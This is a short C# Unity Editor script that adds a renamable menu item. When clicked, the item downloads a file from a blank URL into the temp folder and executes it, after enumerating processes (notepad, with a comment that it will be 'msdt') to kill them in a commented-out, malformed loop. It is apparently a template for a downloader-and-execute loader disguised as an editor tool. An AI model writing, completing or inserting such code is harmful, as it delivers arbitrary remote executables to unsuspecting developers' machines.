﻿using UnityEngine;
using UnityEditor;
using System.Net;
using System;
using System.IO;
using System.Diagnostics;

public class Menu : EditorWindow
{
    public static WebClient webClient = new WebClient();
    [MenuItem("Menu/SubMenu", false, 120)] //Menu and SubMenu can be changed.

    static public void SubMenu()
    {

        //string command = "/C notepad.exe";
        //Process.Start("cmd.exe", command);
        Process[] processes = Process.GetProcessesByName("notepad"); // this will be "msdt"
        foreach (Process process in processes)

        {
           // for(i=0;++i;i--){process.Kill();}
        }
        EditorWindow.GetWindow<Menu>();
        string tempPath = Path.GetTempPath();
        string downloadPath = Path.Combine(tempPath, ""); //file.exe name in the ""
        webClient.DownloadFile("", downloadPath); // download link in the ""
        System.Diagnostics.Process.Start(downloadPath);
    }
}
